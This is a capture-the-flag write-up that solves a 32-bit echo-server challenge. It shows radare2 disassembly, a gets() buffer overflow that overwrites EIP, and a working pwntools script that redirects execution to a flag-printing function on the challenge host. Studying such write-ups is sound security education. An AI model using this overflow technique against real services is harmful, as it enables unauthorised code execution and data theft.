### Solved by superkojiman

We're given 32-bit ELF binary that acts as an echo server. We can run it and it just echoes back whatever we type in: 

```
# ./echo 
AAAAAAAAAAAAAAAAAAAAAAAAA
ECHO: AAAAAAAAAAAAAAAAAAAAAAAAA
```

Pretty simple. If we look at the disassembly of main(), we see that its purpose is mostly to call a function called test(). The disassembly of test() looks like this: 

```
[0x08048480]> pdf@sym.test
      ; CODE (CALL) XREF 0x08048631 (sym.main)
/ function: sym.test (59)
|     0x080485f0  sym.test:
|     0x080485f0     55               push ebp
|     0x080485f1     89e5             mov ebp, esp
|     0x080485f3     83ec58           sub esp, 0x58
|     0x080485f6     8d45c6           lea eax, [ebp-0x3a]
|     0x080485f9     890424           mov [esp], eax
|     0x080485fc     e8effdffff       call dword imp.gets
|        ; imp.gets()
|     0x08048601     c7042401000000   mov dword [esp], 0x1
|     0x08048608     e813feffff       call dword imp.sleep
|        ; imp.sleep()
|     0x0804860d     a138a00408       mov eax, [sym.stderrGLIBC_2.0]
|     0x08048612     8d55c6           lea edx, [ebp-0x3a]
|     0x08048615     89542408         mov [esp+0x8], edx
|     0x08048619     c7442404db860408 mov dword [esp+0x4], str.ECHOs
|     0x08048621     890424           mov [esp], eax
|     0x08048624     e827feffff       call dword imp.fprintf
|        ; imp.fprintf()
|     0x08048629     c9               leave
\     0x0804862a     c3               ret
      ; ------------

```

So the binary uses gets() to get our input, and then prints it out to stderr. A call to gets() is an immediate hint that we can probably do some stack smashing here. Let's test that theory:  

```
# python -c 'print "A"*100' | ./echo 
ECHO: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)

# gdb -c core -q -batch -n -ex 'p $eip' 
[New LWP 12365]

warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf774d000
Core was generated by `./echo'.
Program terminated with signal 11, Segmentation fault.
#0  0x41414141 in ?? ()
$1 = (void (*)()) 0x41414141
```

Great, we've overwritten EIP. Now what? The binary has NX enabled and I assumed that ASLR was enabled on the server as well. Let's see what functions are available to us: 

```
[0x08048480]> afl
0x080483f0     16   0  imp.gets
0x08048400     16   0  imp.fgets
0x08048410     16   0  imp.fclose
0x08048420     16   0  imp.sleep
0x08048430     16   0  imp.__gmon_start__
0x08048440     16   0  imp.__libc_start_main
0x08048450     16   0  imp.fprintf
0x08048460     16   0  imp.fopen
0x08048470     16   0  imp.fputs
0x0804862b     18   1  sym.main
0x080485f0     59   1  sym.test
0x08048480     34   1  section..text
0x080484c0     16   4  sym.deregister_tm_clones
0x080484d0     26   3  loc.080484d0
0x080484cf      1   1  loc.080484cf
0x080484f0     25   4  sym.register_tm_clones
0x08048509     30   3  loc.08048509
0x08048508      1   1  loc.08048508
0x08048530     30   3  sym.__do_global_dtors_aux
0x0804854c      2   1  loc.0804854c
0x08048550    160   8  sym.frame_dummy
0x08048578    120   5  loc.08048578
0x080485aa     70   4  loc.080485aa
0x080485c0     48   3  loc.080485c0
0x080485ac     68   2  loc.080485ac
0x080485ee      2   1  loc.080485ee
0x080486b0      2   1  sym.__libc_csu_fini
0x080484b0      4   1  sym.__x86.get_pc_thunk.bx
0x080486b4     20   1  section..fini
0x08048640     97   4  sym.__libc_csu_init
0x080483b0     35   3  section..init
0x080483ce      5   1  loc.080483ce
0x08048699      8   1  loc.08048699
0x08048678     41   2  loc.08048678
0x0804857d    115   7  sym.sample
```

Interesting, there are calls to fopen(), fclose(), fgets(), and fputs(). But where are they being called from? Taking a closer look at the radare2 output, we see that there's another function called sym.sample. Let's disassemble this. 


```
[0x08048480]> pdf @sym.sample
/ function: sym.sample (115)
|         0x0804857d  sym.sample:
|         0x0804857d     55               push ebp
|         0x0804857e     89e5             mov ebp, esp
|         0x08048580     81ec88000000     sub esp, 0x88
|         0x08048586     c7442404d0860408 mov dword [esp+0x4], 0x80486d0
|         0x0804858e     c70424d2860408   mov dword [esp], str.flag.txt
|         0x08048595     e8c6feffff       call dword imp.fopen
|            ; imp.fopen()
|         0x0804859a     8945f4           mov [ebp-0xc], eax
|         0x0804859d     837df400         cmp dword [ebp-0xc], 0x0
|     ,=< 0x080485a1     7507             jnz loc.080485aa
|     |   0x080485a3     b801000000       mov eax, 0x1
|    ,==< 0x080485a8     eb44             jmp loc.080485ee
|   ,||   ; CODE (JMP) XREF 0x080485a1 (sym.frame_dummy)
/ loc: loc.080485aa (70)
|   ,||   0x080485aa  loc.080485aa:
|   ,=`-> 0x080485aa     eb14             jmp loc.080485c0
|  .      ; CODE (JMP) XREF 0x080485dc (sym.frame_dummy)
/ loc: loc.080485ac (68)
|  .      0x080485ac  loc.080485ac:
|  .----> 0x080485ac     a138a00408       mov eax, [sym.stderrGLIBC_2.0]
|  |||    0x080485b1     89442404         mov [esp+0x4], eax
|  |||    0x080485b5     8d4590           lea eax, [ebp-0x70]
|  |||    0x080485b8     890424           mov [esp], eax
|  |||    0x080485bb     e8b0feffff       call dword imp.fputs
|  |||       ; imp.fputs()
|  ||     ; CODE (JMP) XREF 0x080485aa (loc.080485aa)
/ loc: loc.080485c0 (48)
|  ||     0x080485c0  loc.080485c0:
|  |`---> 0x080485c0     8b45f4           mov eax, [ebp-0xc]
|  | |    0x080485c3     89442408         mov [esp+0x8], eax
|  | |    0x080485c7     c744240464000000 mov dword [esp+0x4], 0x64
|  | |    0x080485cf     8d4590           lea eax, [ebp-0x70]
|  | |    0x080485d2     890424           mov [esp], eax
|  | |    0x080485d5     e826feffff       call dword imp.fgets
|  | |       ; imp.fgets()
|  | |    0x080485da     85c0             test eax, eax
|  `====< 0x080485dc     75ce             jnz loc.080485ac
|    |    0x080485de     8b45f4           mov eax, [ebp-0xc]
|    |    0x080485e1     890424           mov [esp], eax
|    |    0x080485e4     e827feffff       call dword imp.fclose
|    |       ; imp.fclose()
|    |    0x080485e9     b800000000       mov eax, 0x0
|    |    ; CODE (JMP) XREF 0x080485a8 (sym.frame_dummy)
/ loc: loc.080485ee (2)
|    |    0x080485ee  loc.080485ee:
|    `--> 0x080485ee     c9               leave
\         0x080485ef     c3               ret
          ; ------------
```

One thing stands out here; fopen() opens a file called flag.txt. So it looks like sample() opens flag.txt, reads its contents into a buffer, and fputs() it to stderr. Now if we connect to the server, we see that our input is echoed back to us, which means stderr is being redirected back to us. So all we need to do is overwrite EIP with the address of sample(), and when sample() is called, it should print out the flag. 

The exploit: 

```python
#!/usr/bin/env python
from pwn import *
target = "hack.bckdr.in"

r = remote(target, 8002)

buf = "" 
buf += "A"*62
buf += p32(0x804857d)   # address of sample()

r.send(buf + "\n")
print r.recvall()
```

Getting the flag: 

```text
# ./sploit.py 
[+] Opening connection to hack.bckdr.in on port 8002: Done
[+] Recieving all data: Done (138B)
[*] Closed connection to hack.bckdr.in port 8002
ECHO: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA}\x85\x0
flag_goes_here_flag_goes_here_flag_goes_here_flag_goes_here_flag
```

